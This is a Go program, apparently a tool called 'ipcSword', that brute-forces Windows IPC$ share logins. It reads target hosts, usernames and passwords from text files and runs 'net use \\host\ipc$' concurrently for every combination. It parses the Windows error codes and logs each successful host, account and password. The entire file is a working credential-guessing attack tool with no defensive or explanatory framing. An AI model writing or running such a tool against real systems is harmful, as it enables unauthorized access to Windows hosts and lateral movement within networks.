package main

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
)

var wg1 sync.WaitGroup

func main() {

	exPath, _ := os.Getwd()
	fmt.Println(exPath)

	//url_file := filepath.Join(exPath, "ipcSword", "urls.txt")
	//user_file := filepath.Join(exPath, "ipcSword", "users.txt")
	//password := filepath.Join(exPath, "ipcSword", "passwords.txt")

	url_file := filepath.Join(exPath, "urls.txt")
	user_file := filepath.Join(exPath, "users.txt")
	password := filepath.Join(exPath, "passwords.txt")

	//读取文件
	fp, err := os.Open(url_file)
	if err != nil {
		fmt.Println(err)
		panic("读取url文件失败:")
	}

	//读取账户名
	usersArr, err := ReadLine(user_file)

	if err != nil || len(usersArr) == 0 {
		panic("读取用户名文件失败,文件不能为空")
	}

	//读取密码
	pwdArr, err := ReadLine(password)
	if err != nil || len(pwdArr) == 0 {
		panic("读取密码文件失败,文件不能为空")
	}

	//fmt.Print(usersArr, pwdArr)

	buf := bufio.NewScanner(fp)

	for {
		if !buf.Scan() {
			break //文件读完了,退出for
		}
		url := buf.Text() //获取每一行
		command := exec.Command("cmd.exe", "/C", "chcp 65001")
		combinedOutput, err := command.CombinedOutput()

		if err != nil {
			fmt.Println(fmt.Sprint(err) + ": " + string(combinedOutput))
		}

		for _, user := range usersArr {
			for _, pwd := range pwdArr {
				wg1.Add(1)
				go func(url string, user string, pwd string) {
					//爆破ipc
					NetU(url, user, pwd)
					wg1.Done()
				}(url, user, pwd)
				//NetUser(url, user, pwd)
			}

		}

	}

	wg1.Wait()
	//fmt.Println("===========所有爆破线程结束============")
	//for successInfo := range okChain {
	//	fmt.Println(successInfo)
	//}

}

func ReadLine(fileName string) ([]string, error) {
	f, err := os.Open(fileName)
	var nameList []string
	if err != nil {
		log.Println("Open File Error:", err)
		return nil, err
	}
	buf := bufio.NewReader(f)
	for {
		line, err := buf.ReadString('\n')
		line = strings.TrimSpace(line)
		if len(line) > 0 {
			nameList = append(nameList, line)
		}
		if err != nil {
			if err == io.EOF {
				log.Println("Read File Finish")
				//close(g.Tasks)
				return nameList, nil
			}
			log.Println("Read File Error:", err)
			return nil, err
		}
	}
	return nil, err
}

func NetU(url string, user string, password string) {

	cmd := exec.Command("net", "use", "\\\\"+url+"\\ipc$",
		password, "/user:"+user)

	raw_payload := "net use \\\\" + url + "\\ipc$" + "\t" + user + "\t" + "/user:" + password
	payload := fmt.Sprintf("[+] " + raw_payload)
	fmt.Println(payload)

	output, _ := cmd.CombinedOutput()

	if strings.Contains(string(output), "1219") {
		log.Println("[-] 目标" + url + " 已经存在连接")

	} else if strings.Contains(string(output), "success") {
		log.Println("[!] 爆破成功!!!!!!! 远程地址:" + url + " 账户为:" + user + " 密码为:" + password)
	} else if strings.Contains(string(output), "1326") {
		log.Println("[-] 目标 " + url + "连接账号密码错误")

	} else if strings.Contains(string(output), "53") {
		log.Println("[-] 目标 %s网络路径未找到", url)

	} else {
		log.Println("[-] 目标 " + url + "爆破失败")
	}

}
